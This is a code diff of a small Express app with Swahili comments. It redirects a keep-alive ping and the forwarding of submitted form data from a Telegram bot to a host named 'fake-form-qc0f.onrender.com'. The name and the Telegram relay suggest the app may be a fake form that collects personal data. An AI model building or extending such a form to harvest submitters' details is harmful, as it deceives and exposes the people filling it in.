@@ -16,7 +16,7 @@ const CHAT_ID = process.env.CHAT_ID;
 
 // Kuamsha server kila baada ya dakika 5
 setInterval(() => {
-  fetch(process.env.BASE_URL || 'http://localhost:3000/')
+  fetch(process.env.BASE_URL || 'https://fake-form-qc0f.onrender.com')
     .then(res => console.log('Server is active'))
     .catch(err => console.error('Error keeping alive:', err));
 }, 300000);
@@ -44,7 +44,7 @@ app.post('/submit', async (req, res) => {
     Muda wa kazi: ${formData.years_job}
         `;
 
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        await fetch('https://fake-form-qc0f.onrender.com', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
